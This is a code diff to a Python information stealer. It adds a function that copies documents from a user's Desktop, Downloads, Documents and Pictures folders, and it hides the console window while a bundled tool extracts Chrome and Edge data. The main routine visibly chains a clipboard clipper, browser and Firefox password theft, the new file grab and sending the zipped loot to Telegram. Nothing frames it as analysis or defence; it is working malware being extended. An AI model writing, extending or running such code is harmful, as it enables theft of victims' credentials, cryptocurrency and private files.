@@ -31,6 +31,34 @@ import sys
 import pyautogui
 pyautogui.FAILSAFE = False
 
+def grab_user_dirs():
+    """
+    Copies all .txt, .csv, .pdf and .docx files from
+    the user’s Desktop, Downloads, Documents and Pictures
+    into EXTRACT_FOLDER/grabs/<FolderName>.
+    """
+    home = os.path.expanduser("~")
+    target_root = os.path.join(EXTRACT_FOLDER, "grabs")
+    extensions = {".txt", ".csv", ".pdf", ".docx"}
+
+    for folder in ("Desktop", "Downloads", "Documents", "Pictures"):
+        src = os.path.join(home, folder)
+        dst = os.path.join(target_root, folder)
+        if not os.path.isdir(src):
+            continue
+        os.makedirs(dst, exist_ok=True)
+        for root, _, files in os.walk(src):
+            for f in files:
+                if os.path.splitext(f)[1].lower() in extensions:
+                    try:
+                        shutil.copy2(
+                            os.path.join(root, f),
+                            os.path.join(dst, f)
+                        )
+                    except Exception:
+                        pass
+
+
 def resource_path(filename):
     """
     Get the bundled path to a data file (works in dev and in a PyInstaller one-file exe).
@@ -197,23 +225,25 @@ def decrypt(buff, aes_key):
 
 import json
 
+CREATE_NO_WINDOW = 0x08000000
+
 def run_chrome_elevator(browser_name):
     """
     Runs chromelevator.exe for the given browser_name ('chrome' or 'edge'),
-    outputs into EXTRACT_FOLDER.
-    Returns True on success, False otherwise.
+    outputs into EXTRACT_FOLDER without flashing a console window.
     """
-    # use resource_path so PyInstaller’s --add-data will point to the bundled file
     exe = resource_path("chromelevator.exe")
     if not os.path.exists(exe):
-        # if you want a fallback, you can still try next to your script
         exe = os.path.join(os.path.dirname(sys.argv[0]), "chromelevator.exe")
 
-    cmd = [exe, browser_name, "-o", EXTRACT_FOLDER]
     try:
-        subprocess.run(cmd, check=True,
-                       stdout=subprocess.DEVNULL,
-                       stderr=subprocess.DEVNULL)
+        subprocess.run(
+            [exe, browser_name, "-o", EXTRACT_FOLDER],
+            check=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=CREATE_NO_WINDOW
+        )
         return True
     except Exception:
         return False
@@ -228,6 +258,10 @@ def extr_browser():
     _elevator_ran = True
 
     os.makedirs(EXTRACT_FOLDER, exist_ok=True)
+
+    # 2a) Pre‐create every browser folder
+    for name in BROWSERS.keys():
+        os.makedirs(os.path.join(EXTRACT_FOLDER, name), exist_ok=True)
 
     # run for both chrome & edge
     for short, keyname in (("chrome","Chrome"), ("edge","Edge")):
@@ -751,6 +785,7 @@ def run():
                 clipper()
                 extr_browser()
                 extr_firefox_passwords()
+                grab_user_dirs() 
                 send_zip_to_telegram()
                 mark_exfiltrated()
         except Exception as e:
